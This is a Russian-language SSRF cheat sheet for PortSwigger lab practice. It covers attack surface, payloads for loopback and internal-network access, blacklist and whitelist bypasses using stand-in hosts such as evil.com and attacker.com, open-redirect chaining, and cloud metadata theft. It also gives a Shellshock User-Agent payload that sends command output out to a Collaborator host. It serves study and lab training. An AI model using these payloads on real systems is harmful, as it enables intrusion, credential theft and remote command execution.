## 🧠 1. Что такое SSRF?

**SSRF (Server-Side Request Forgery)** — уязвимость, при которой ты заставляешь **сервер** отправить HTTP-запрос **от своего имени**.

### 🎯 Почему это опасно?

Сервер обычно находится **внутри сети**, и ему доверяют другие системы. Если ты управляешь его запросами — ты можешь:

| Куда отправить запрос | Что получишь |
|---|---|
| **Сам сервер** (`127.0.0.1`) | Доступ к админке, скрытым эндпоинтам |
| **Внутренние системы** (`192.168.x.x`) | Сканирование сети, доступ к БД, Redis, etc. |
| **Внешние системы** | Атака выглядит «от имени сервера» — обход IP-фильтров |
| **Облачные метаданные** (`169.254.169.254`) | Токены AWS/GCP/Azure → полный захват аккаунта |

### 🧩 Классический пример

Сайт принимает URL картинки и загружает её:
```
POST /load-image
imageUrl=http://example.com/cat.jpg
```

Ты подменяешь URL:
```
imageUrl=http://127.0.0.1/admin
```

Сервер стучится **к самому себе** в админку — и возвращает тебе ответ. 🎩

### 🆚 Чем отличается от обычной атаки?
- **CSRF** — заставляешь **жертву** сделать запрос.
- **SSRF** — заставляешь **сервер** сделать запрос.

## 📖 Как читать эту шпаргалку

| Обозначение | Что значит |
|---|---|
| `stockApi=`, `url=`, `path=` | Имена типичных уязвимых параметров |
| `127.0.0.1` | Loopback — «сам сервер» |
| `192.168.x.x`, `10.x.x.x` | Внутренние сети (RFC 1918) |
| `169.254.169.254` | Метаданные облака (AWS/GCP) |
| **Blacklist** | Запрещён список плохих слов |
| **Whitelist** | Разрешён только список хороших |
| **OAST** | Out-of-Band — детект через внешний сервер (Collaborator) |

## 🔍 2. Где искать SSRF (поверхность атаки)

**Ищи любые места, где пользовательский ввод попадает в URL, который сервер потом запрашивает.**

### 📍 Основные места

| Место | Примеры параметров |
|---|---|
| **Query-параметры** | `stockApi=`, `url=`, `path=`, `dest=`, `redirect=`, `next=`, `image=`, `feed=` |
| **Заголовки** | `Referer` (аналитика), `X-Forwarded-For`, `Host` |
| **Тело (JSON/XML)** | Поля, содержащие URL |
| **Частичные URL** | Ты контролируешь только хо**ст** или только **путь** |
| **Webhooks** | «Укажите URL для уведомлений» |
| **Загрузка файлов** | «Загрузить по ссылке» |
| **PDF-генераторы** | «Экспорт отчёта по URL» |

### 🕵️ Как понять, что это SSRF?

1. Меняешь URL → ответ **меняется**.
2. Указываешь свой Collaborator-домен → видишь **DNS/HTTP-запрос от сервера**.
3. Пробуешь `http://127.0.0.1` → получаешь админку или другой ответ.

## 🚀 3. Базовые SSRF-атаки

### 3.1 🎯 Атака на сам сервер (loopback)

**Цель:** заставить сервер обратиться к себе. Обычно это открывает админку или скрытые эндпоинты.

**Пейлоады:**
```
http://127.0.0.1/admin
http://localhost/admin
http://0/admin
http://127.1/admin
http://[::1]/admin
http://127.0.0.1:8080/admin
```

**Почему это работает:** многие приложения доверяют запросам «изнутри» и **не требуют авторизации** для localhost.

### 3.2 🗺️ Атака на внутренние системы (back-end)

**Цель:** просканировать внутреннюю сеть и найти другие сервисы.

**Диапазоны для сканирования:**

| Диапазон | Что там обычно |
|---|---|
| `192.168.0.0/24` | Домашние сети, офисные подсети |
| `10.0.0.0/8` | Корпоративные сети |
| `172.16.0.0/12` | Внутренние инфраструктуры |

**Пример:**
```
http://192.168.0.1/admin
http://10.0.0.5:6379/    ← Redis
http://10.0.0.10:3306/   ← MySQL
```

### 🤖 Автоматизация в Burp Intruder

1. Отправь запрос в **Intruder**.
2. Поставь метку на последний октет: `http://192.168.0.§1§:8080/admin`
3. **Payload type:** Numbers, **From:** 1, **To:** 255.
4. Запусти.
5. **Анализ:** сортируй по **Status code** и **Length** — где отличаются, там что-то интересное.

## 🛡️ 4. Обход фильтров (Bypass)

Разработчики часто пытаются блокировать SSRF. Разберём обход.

### 4.1 ⚫ Обход чёрного списка (Blacklist Bypass)

**Ситуация:** заблокированы слова `127.0.0.1` и `localhost`.

**Обход — используй альтернативные представления того же адреса:**

| Метод | Пример | Почему работает |
|---|---|---|
| Сокращённый IP | `http://127.1/admin` | Браузер/сервер сам разворачивает в `127.0.0.1` |
| Десятичный | `http://2130706433/admin` | `127.0.0.1` как одно число |
| Шестнадцатеричный | `http://0x7f000001/admin` | Hex-представление IP |
| Восьмеричный | `http://017700000001/admin` | Octal-представление |
| IPv6 | `http://[::1]/admin` | Другой способ написать loopback |
| Точка на конце | `http://localhost./admin` | DNS-парсер видит другой хост |
| Свой домен → 127.0.0.1 | `http://spoofed.burpcollaborator.net` | Твой DNS указывает на 127.0.0.1 |

**URL-кодирование:**
```
/%2561dmin          ← двойное кодирование 'a'
http://%09localhost/admin    ← табуляция
http://%0Alocalhost/admin    ← перевод строки
```

### 4.2 ⚪ Обход белого списка (Whitelist Bypass)

**Ситуация:** разрешён **только** домен `stock.weliketoshop.net`.

**Обход — используй несоответствия в парсинге URL:**

| Метод | Пример | Почему работает |
|---|---|---|
| **Учётные данные через `@`** | `http://stock.weliketoshop.net@127.0.0.1/admin` | Браузер парсит `stock.weliketoshop.net` как **username**, а реальный хост — `127.0.0.1` |
| **Фрагмент `#`** | `http://stock.weliketoshop.net#@127.0.0.1/admin` | Часть после `#` — фрагмент |
| **Поддомен** | `http://stock.weliketoshop.net.attacker.com/admin` | Валидатор смотрит на начало строки |
| **Кодирование `@`** | `http://stock.weliketoshop.net%40evil.com/admin` | Разный парсинг у валидатора и бэкенда |

> 🧠 **Запомни:** `http://A@B/` — это «зайти на хост B с логином A». Валидатор видит `A` (разрешён), сервер идёт на `B`.

### 4.3 🔀 Обход через открытый редирект (Open Redirect Bypass)

**Ситуация:** белый список нельзя обойти напрямую, но на разрешённом домене есть **открытый редирект**.

**Что такое открытый редирект?** Эндпоинт, который перенаправляет пользователя на произвольный URL. Пример: `/product/nextProduct?path=http://evil.com`.

**Схема атаки:**

1. Разрешённый домен `weliketoshop.net` имеет открытый редирект:
   ```
   http://weliketoshop.net/product/nextProduct?path=http://evil.com
   ```
2. Используем его в `stockApi`:
   ```
   stockApi=http://weliketoshop.net/product/nextProduct?path=http://192.168.0.68/admin
   ```
3. Валидатор пропускает (`weliketoshop.net` разрешён) → сервер идёт по редиректу → попадает на `192.168.0.68/admin` → 🎉

## 👻 5. Слепая SSRF (Blind SSRF)

**Ситуация:** сервер отправляет запрос, но **ответ тебе не возвращается**.

### 🔍 Как обнаружить?

Используй **OAST** (Out-of-Band) — заставь сервер стукнуть на **твой** сервер, и посмотри, пришёл ли запрос.

**Инструменты:**
- **Burp Collaborator** — встроен в Burp Suite Pro.
- **Interactsh** — бесплатная альтернатива (но в лабах PortSwigger **не работает**).
- **Collaborator Everywhere** — расширение Burp, автоматически подставляет Collaborator во все параметры.

### 5.1 🕵️ Обнаружение Blind SSRF

1. Открой Burp Collaborator → **Copy to clipboard**.
2. Вставь адрес в уязвимый параметр:
   ```
   stockApi=http://твой-поддомен.oastify.com/
   ```
3. Нажми **Poll now** в Collaborator.
4. Если видишь **DNS-запрос** или **HTTP-запрос** — SSRF есть. ✅

### 5.2 💥 Эксфильтрация через Shellshock

**Когда применимо:** если внутренний сервер уязвим к **Shellshock** (CVE-2014-6271).

**Идея:** в HTTP-заголовке `User-Agent` (или другом) можно спрятать bash-команду. Внутренний сервер её выполнит и отправит результат на твой Collaborator.

Пример payload в `User-Agent`:
```
User-Agent: () { :; }; /usr/bin/nslookup $(whoami).твой.burpcollaborator.net
```

Если в Collaborator прилетел DNS-запрос с `whoami` — команда выполнилась. 🎯

## 🧩 7. Генератор пейлоадов (URL Validation Bypass Cheat Sheet)

**Ссылка:** [portswigger.net/web-security/ssrf/url-validation-bypass-cheat-sheet](https://portswigger.net/web-security/ssrf/url-validation-bypass-cheat-sheet)

**Как пользоваться:**

1. **Выбери контекст:**
   - **Fully qualified absolute URL** — обычный параметр (`stockApi=http://...`)
   - **Only hostname** — только заголовок `Host`
   - **CORS Origin** — заголовок `Origin`

2. **Настрой параметры:**
   - **Domain Allow List Bypass** — укажи разрешённый и целевой домены.
   - **Loopback Address** — генератор всех вариантов `127.0.0.1`.

3. **Выбери кодировки:**
   - **Intruder's Percent Encoding** — по умолчанию.
   - **Everything** — кодирует все символы.
   - **Special Chars** — только спецсимволы.
   - **Unicode Escape**.

**Результат:** список готовых пейлоадов для копирования прямо в Burp.

## 📝 8. Чек-лист для лабораторий PortSwigger

**Проходишь лабу? Иди по шагам:**

1. ✅ **Найди уязвимый параметр** — обычно `stockApi`, `url`, `path`.
2. ✅ **Проверь localhost:**
   ```
   stockApi=http://localhost/admin
   ```
3. ✅ **Заблокировано? → Обходи фильтр:**
   - Чёрный список: `http://127.1/admin`, `http://2130706433/admin`
   - Белый список: `http://stock.weliketoshop.net@127.0.0.1/admin`
4. ✅ **Админка на другом порту?**
   ```
   stockApi=http://127.0.0.1:8080/admin
   ```
5. ✅ **Ответа не видно (Blind)?** → Collaborator.
6. ✅ **Есть открытый редирект?** → используй его как мостик.
7. ✅ **Выполни действие:**
   ```
   /admin/delete?username=carlos
   ```

## 🚀 Мини-шпаргалка «что куда»

**Открой в следующий раз первым делом.**

| Ситуация | Что делать |
|---|---|
| Есть параметр с URL | Начни с `http://127.0.0.1/admin` |
| Заблокирован `127.0.0.1` | `http://127.1/`, `http://2130706433/`, `http://[::1]/` |
| Разрешён только 1 домен | `http://allowed.com@127.0.0.1/` |
| Не вижу ответа | Burp Collaborator → Poll now |
| Хочу просканировать сеть | Intruder → Numbers 1–255 в `192.168.0.§1§` |
| Есть открытый редирект | `stockApi=http://allowed.com/redirect?url=http://evil/` |
| Нужно выполнить команду | Shellshock через `User-Agent` (в лабах PS) |
| Атакую облако | `http://169.254.169.254/latest/meta-data/` |
